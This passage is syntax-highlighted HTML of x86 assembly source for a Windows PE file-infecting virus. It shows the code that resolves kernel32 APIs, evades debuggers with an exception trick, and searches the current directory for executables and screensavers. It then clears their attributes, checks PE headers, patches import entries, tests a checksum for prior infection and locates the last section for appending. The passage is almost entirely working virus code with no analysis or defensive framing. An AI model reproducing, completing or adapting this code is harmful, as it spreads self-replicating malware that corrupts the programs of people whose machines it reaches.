    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyGetModuleHandleA</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;GetModuleHandleA API</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;get module of kernel32</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">                  </span><span class="sc1">;shit, not found, jump to host</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Virus_End</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get addresses of APIs</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">f_names</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GetAPIAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MyGetProcAddress</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">GetAPIAddress</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">                      </span><span class="sc1">;now, we have all APIs, we can check</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">seh_fn</span><span class="sc4">&gt;</span><span class="sc0">            </span><span class="sc1">;for debugger</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;raise exception</span><span class="sc0">
                            </span><span class="sc1">;now, we continue at seh_fn label</span><span class="sc0">

</span><span class="sc5">seh_rs</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PathName</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;debugger not present, continue</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyGetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get current directory</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WindowsPath</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyGetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get windows directory</span><span class="sc0">

</span><span class="sc5">Next_Char</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmpsb</span><span class="sc0">                       </span><span class="sc1">;compare directories</span><span class="sc0">
</span><span class="sc5">jmp_patch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoMatch</span><span class="sc0">                 </span><span class="sc1">;this jump will be path in next check</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Try_Process_Dir</span><span class="sc0">             </span><span class="sc1">;jump for next check fail</span><span class="sc0">
</span><span class="sc5">Matched_Char</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;end of string ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Next_Char</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">

</span><span class="sc5">NoMatch</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;check for system directory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WindowsPath</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyGetSystemDirectoryA</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">jmp_patch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">       </span><span class="sc1">;patch jump</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Next_Char</span><span class="sc0">

</span><span class="sc5">Try_Process_Dir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindFirstFile</span><span class="sc0">          </span><span class="sc1">;we arnt in \windoze or \system dir, find file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;success ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Try_Scr</span><span class="sc0">              </span><span class="sc1">;nope, try SCRs</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">process_dir_check</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckFileName</span><span class="sc0">          </span><span class="sc1">;check name</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">Infect_File</span><span class="sc0">             </span><span class="sc1">;ok, infect file</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindNextFile</span><span class="sc0">           </span><span class="sc1">;nope, find next file</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">process_dir_check</span><span class="sc0">           </span><span class="sc1">;ok, check name</span><span class="sc0">

</span><span class="sc5">Try_Scr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindClose</span><span class="sc0">              </span><span class="sc1">;find previous searchin</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszScr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyFindFirstFileA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;find first SCR</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">                 </span><span class="sc1">;no files left, jump to host</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
</span><span class="sc5">Infect_File</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">;Check size</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_size_check</span><span class="sc0">          </span><span class="sc1">;discard directories</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_nFileSizeHigh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;discard huge files</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_size_check</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">          </span><span class="sc1">;discard small files</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">end_size_check</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64000</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">end_size_check</span><span class="sc0">           </span><span class="sc1">;discard huge files</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;blank file attributez</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MySetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_size_check</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;open and map file</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Start_Virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Virtual_End</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_SetFileAttributez</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">        </span><span class="sc1">;Check PE-header</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_FileHeader.FH_Machine</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14ch</span><span class="sc0">                </span><span class="sc1">;must be 386+</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">                </span><span class="sc1">;at least 3 sections</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2002h</span><span class="sc0">              </span><span class="sc1">;executable, but not DLL</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">   
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc4">*</span><span class="sc2">65536</span><span class="sc0">    </span><span class="sc1">;image base only 400000h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszGetModuleHandleA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszKernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddressIT</span><span class="sc0">           </span><span class="sc1">;find GetModuleHandleA API entry</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyGetModuleHandleA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">400000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;save that entry</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;load 64bit checksum</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">MZ_res2</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Win32_Find_Data.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">MZ_res2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Checksum64</span><span class="sc0">             </span><span class="sc1">;generate new 64bit checksum</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;and compare checksums</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_Infect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

</span><span class="sc5">n_Infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_OptionalHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;locate first section</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get number of sctnz</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;get LAST section</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">BSection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NBiggest</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">NBiggest</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">BSection</span><span class="sc0">   
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

